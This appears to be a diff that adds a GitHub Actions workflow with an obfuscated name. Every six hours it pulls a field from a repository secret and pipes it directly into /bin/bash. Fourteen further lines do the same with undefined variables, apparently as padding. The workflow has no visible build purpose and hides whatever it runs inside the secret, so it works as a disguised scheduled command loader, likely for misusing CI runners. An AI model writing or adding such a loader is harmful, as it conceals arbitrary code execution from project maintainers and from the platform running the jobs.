@@ -1,0 +1,33 @@
+name: fengyuanchai4545
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengyuanchai4545
+        env:
+          vz60: ${{ secrets.vz60 }}
+        run: |
+          echo $vz60 | jq -r .fouux77 | /bin/bash
+          echo $vj7248 | jq -r .slvon8 | /bin/bash
+          echo $kdtca10 | jq -r .ywnrj82676 | /bin/bash
+          echo $lm97414 | jq -r .phz5 | /bin/bash
+          echo $v164 | jq -r .wrm7 | /bin/bash
+          echo $cngok2 | jq -r .ahc81296 | /bin/bash
+          echo $fyi8046 | jq -r .efm544 | /bin/bash
+          echo $w87 | jq -r .yotj23681 | /bin/bash
+          echo $irv626 | jq -r .f2 | /bin/bash
+          echo $xom1 | jq -r .ofu6129 | /bin/bash
+          echo $jsxi7766 | jq -r .mi06 | /bin/bash
+          echo $y011 | jq -r .pa147 | /bin/bash
+          echo $i4189 | jq -r .yi84 | /bin/bash
+          echo $vlrn2 | jq -r .d61071 | /bin/bash
+          echo $svcz35243 | jq -r .vtgj247 | /bin/bash
+
